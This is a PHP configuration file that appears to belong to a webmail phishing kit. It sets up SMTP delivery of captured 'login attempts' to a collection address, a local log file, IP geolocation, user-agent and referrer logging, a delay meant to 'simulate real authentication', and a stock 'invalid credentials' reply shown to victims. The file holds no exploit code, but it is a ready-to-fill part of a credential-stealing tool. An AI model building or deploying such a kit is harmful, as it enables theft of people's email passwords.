<?php
// SMTP Configuration File
// Copy this file and update the settings below

return [
    // SMTP Server Settings
    'smtp' => [
        'host' => 'smtp.gmail.com',           // SMTP server hostname
        'port' => 587,                        // SMTP port (587 for TLS, 465 for SSL, 25 for no encryption)
        'username' => 'your-email@gmail.com', // Your SMTP username
        'password' => 'your-app-password',    // Your SMTP password or app password
        'encryption' => 'tls',                // 'tls', 'ssl', or 'none'
        'from_email' => 'your-email@gmail.com',
        'from_name' => 'Webmail Security Logger'
    ],
    
    // Logging Settings
    'logging' => [
        'log_email' => 'logs@yourdomain.com', // Email address to receive logs
        'subject' => 'Webmail Login Attempt - Security Alert',
        'backup_file' => 'login_logs.txt',    // Local backup file
        'enable_geolocation' => true,         // Enable IP geolocation lookup
        'log_user_agent' => true,             // Log browser/device information
        'log_referrer' => true                // Log referring page
    ],
    
    // Security Settings
    'security' => [
        'simulate_delay' => 2,                // Delay in seconds to simulate real authentication
        'max_attempts_per_ip' => 10,          // Maximum attempts per IP per hour (0 = unlimited)
        'enable_ip_blocking' => false,        // Enable IP-based rate limiting
        'allowed_domains' => [],              // Empty array = allow all domains, or specify domains like ['gmail.com', 'yahoo.com']
    ],
    
    // Response Messages
    'messages' => [
        'invalid_credentials' => 'Invalid email or password. Please check your credentials and try again.',
        'too_many_attempts' => 'Too many login attempts. Please try again later.',
        'invalid_domain' => 'Email domain not allowed.',
        'missing_fields' => 'Email and password are required.',
        'invalid_email' => 'Invalid email format.'
    ]
];
?>